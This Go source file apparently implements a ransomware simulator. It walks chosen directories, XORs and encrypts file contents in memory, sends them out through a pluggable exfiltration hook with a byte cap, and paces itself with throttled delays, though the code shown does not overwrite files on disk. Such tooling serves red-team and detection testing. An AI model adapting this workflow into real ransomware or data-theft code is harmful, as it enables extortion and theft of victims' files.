package ransimware

import (
	"crypto/rand"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"time"

	"gitlab.com/mjwhitta/pathname"
	"gitlab.com/mjwhitta/safety"
	tp "gitlab.com/mjwhitta/threadpool"
)

// Simulator is a struct containing all simulation metadata.
type Simulator struct {
	count          *safety.Uint64
	Encrypt        func(fn string, b []byte) ([]byte, error)
	excludes       []*regexp.Regexp
	Exfil          func(fn string, b []byte) error
	ExfilFilenames bool
	ExfilThreshold uint64
	includes       []*regexp.Regexp
	last           []time.Time
	MaxFileSize    int64
	Notify         func() error
	OTP            [32]byte
	paths          []string
	Threads        int
	WaitEvery      time.Duration
	WaitFor        time.Duration
}

// New will return a pointer to a new Simulator instance.
func New(threads int) *Simulator {
	var e error
	var s = &Simulator{
		count:       safety.NewUint64(),
		Encrypt:     DefaultEncrypt,
		Exfil:       DefaultExfil,
		MaxFileSize: 128 * 1024 * 1024,
		Notify:      DefaultNotify,
		Threads:     threads,
	}

	if _, e = rand.Read(s.OTP[:]); e != nil {
		// Fallback to hard-coded incrementing bytes
		s.OTP[0] = 0x41
		for i := 1; i < 32; i++ {
			s.OTP[i] = s.OTP[i-1] + 1
		}
	}

	return s
}

// Exclude will add the specified pattern to the do-not-target list.
func (s *Simulator) Exclude(pattern string) error {
	var e error
	var r *regexp.Regexp

	// Ensure valid regex
	if r, e = regexp.Compile(pattern); e != nil {
		return e
	}

	s.excludes = append(s.excludes, r)
	return nil
}

// Include will add the specified pattern to the target list.
func (s *Simulator) Include(pattern string) error {
	var e error
	var r *regexp.Regexp

	// Ensure valid regex
	if r, e = regexp.Compile(pattern); e != nil {
		return e
	}

	s.includes = append(s.includes, r)
	return nil
}

func (s *Simulator) processFile(tid int, data tp.ThreadData) {
	var contents []byte
	var e error
	var exfil bool = true
	var f *os.File
	var path string = data["path"].(string)
	var size uint64
	var tmp []byte

	// Check if delay is needed
	s.last[tid] = wait(s.last[tid], s.WaitEvery, s.WaitFor)

	if f, e = os.Open(path); e != nil {
		fmt.Println(e.Error())
		return
	}
	defer f.Close()

	// Read file
	if contents, e = ioutil.ReadAll(f); e != nil {
		fmt.Println(e.Error())
		return
	}

	// Close file
	f.Close()

	// Turn file contents into garbage
	for i := range contents {
		contents[i] ^= s.OTP[i%32]
	}

	// Encrypt contents
	if tmp, e = s.Encrypt(path, contents); e != nil {
		fmt.Println(e.Error())
		tmp = contents
	}

	// If threshold is achieved, stop data exfil
	if s.ExfilThreshold > 0 {
		exfil = false
		size = uint64(len(tmp))

		if s.ExfilThreshold > size {
			exfil = s.count.LessEqualAdd(s.ExfilThreshold-size, size)
		}
	}

	// Exfil
	if exfil {
		if !s.ExfilFilenames {
			path = ""
		}

		if e = s.Exfil(path, tmp); e != nil {
			fmt.Println(e.Error())
		}
	}
}

// Target will add a path to the simulator.
func (s *Simulator) Target(path string) error {
	var e error

	// Ensure path exists
	if !pathname.DoesExist(path) {
		return fmt.Errorf("Path %s does not exist", path)
	}

	if path, e = filepath.Abs(path); e != nil {
		return e
	}

	s.paths = append(s.paths, path)
	return nil
}

// Run will start the simulator.
func (s *Simulator) Run() error {
	var e error
	var include bool
	var last time.Time = time.Now()
	var pool *tp.ThreadPool

	// Initialize ThreadPool
	if pool, e = tp.New(s.Threads); e != nil {
		return e
	}
	defer pool.Close()

	// Initialize array of intermittent delays
	s.last = make([]time.Time, s.Threads+1)
	for i := range s.last {
		s.last[i] = last
	}

	// Walk paths
	for _, root := range s.paths {
		e = filepath.Walk(
			root,
			func(path string, info os.FileInfo, e error) error {
				// Check if delay is needed
				s.last[0] = wait(s.last[0], s.WaitEvery, s.WaitFor)

				if e != nil {
					// Ignore errors as we want to traverse everything
					// we possibly can
					return nil
				}

				// Ignore directories and symlinks
				if info.IsDir() {
					return nil
				} else if (info.Mode() & os.ModeSymlink) > 0 {
					return nil
				}

				// Ignore files larger than MaxFileSize
				if info.Size() > s.MaxFileSize {
					return nil
				}

				// Check includes and excludes
				include = len(s.includes) == 0
				for _, r := range s.includes {
					if r.MatchString(path) {
						include = true
						break
					}
				}

				if !include {
					return nil
				}

				for _, r := range s.excludes {
					if r.MatchString(path) {
						return nil
					}
				}

				// Process file
				pool.Queue(s.processFile, tp.ThreadData{"path": path})

				return nil
			},
		)
		if e != nil {
			fmt.Println(e.Error())
		}
	}

	// Wait for all threads to finish
	pool.Wait()

	return s.Notify()
}
